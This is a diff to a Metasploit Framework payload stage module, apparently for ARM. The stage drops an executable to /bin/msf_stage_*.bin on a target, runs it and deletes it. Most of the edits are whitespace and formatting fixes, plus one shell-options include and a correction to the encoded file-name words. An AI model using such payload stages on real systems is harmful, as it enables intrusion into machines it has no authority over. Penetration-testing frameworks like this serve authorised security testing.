@@ -3,18 +3,19 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
+
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -57,13 +58,13 @@ module Metasploit3
 							0xeb000007, # bl unlink_file
 
 							# executable file name (/bin/msf_stage_xxxxxxxxxx.bin)
-							0x6e69622f, 
-							0x66736d2f, 
-							0x6174735f, 
-							0x785f6567, 
-							0x78787878, 
+							0x6e69622f,
+							0x66736d2f,
+							0x6174735f,
+							0x785f6567,
 							0x78787878,
-							0x6e69622e, 
+							0x78787878,
+							0x6e69622e,
 							0x00000000,
 
 							# unlink file
@@ -145,13 +146,14 @@ module Metasploit3
 			))
 		register_options(
 			[
-				OptPath.new('PEXEC', [ true, "Full path to the file to execute", File.join(Msf::Config.install_root, "data", "ipwn", "ipwn")])
-			], self.class)			
+				OptPath.new('PEXEC', [ true, "Full path to the file to execute",
+					File.join(Msf::Config.install_root, "data", "ipwn", "ipwn")])
+			], self.class)
 	end
-	
+
 	def generate_stage
 		data = super
-		
+
 		begin
 			print_status("Reading executable file #{datastore['PEXEC']}...")
 			buff = ::IO.read(datastore['PEXEC'])
@@ -162,12 +164,12 @@ module Metasploit3
 			print_error("Failed to read executable: #{$!}")
 			return
 		end
-		
+
 		if(data.length > (1024*1024*8))
 			print_error("The executable and stage must be less than 8Mb")
 			return
 		end
-		
+
 		temp = Rex::Text.rand_text_alphanumeric(9)
 		data.gsub("msf_stage_xxxxxxxxx.bin", "msf_stage_#{temp}.bin")
 	end
